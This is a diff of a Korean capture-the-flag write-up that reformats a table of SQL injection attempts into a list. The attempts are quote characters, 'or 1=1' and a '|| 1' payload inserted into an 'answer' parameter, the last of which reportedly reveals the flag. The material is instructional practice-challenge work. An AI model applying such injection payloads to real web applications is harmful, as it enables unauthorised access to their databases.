@@ -444,15 +444,12 @@ setTimeout("answer(0)",10000);
 
  - `answer=1010100000011100101011111&id=admin` 부분에서 `...111` 과 `&id=admin` 사이에 뭔가를 삽입해서 SQL Injection 을 시도해 보자.
  - `"`,`'`,`or 1=1`, 등을 조합하여 넣어 시도해 보자.
-
- | 수정된 값 | 서버로 전송한 결과
- --- | ---
- `answer=1010100000011100101011111"&id=admin` | `query error!`
- `answer=1010100000011100101011111'&id=admin` | `no hack`
- `answer=1010100000011100101011111" or 1&id=admin` | `no hack`
- `answer=1010100000011100101011111" or 1=1 &id=admin` | `no hack`
- `answer=1010100000011100101011111=&id=admin` | `no hack`
- `answer=1010100000011100101011111 || 1&id=admin` | 플래그가 나옴
+  - `answer=1010100000011100101011111"&id=admin` -> `query error!`
+  - `answer=1010100000011100101011111'&id=admin` -> `no hack`
+  - `answer=1010100000011100101011111" or 1&id=admin` -> `no hack`
+  - `answer=1010100000011100101011111" or 1=1 &id=admin` -> `no hack`
+  - `answer=1010100000011100101011111=&id=admin` | `no hack`
+  - `answer=1010100000011100101011111 || 1&id=admin` -> 플래그가 나옴
 
  - SQL Injection 에 성공한 경우, 아래과 같은 내용이 나타난다. 그 중 `answer` 값이 플래그 이므로 제출하면 된다.
  ```
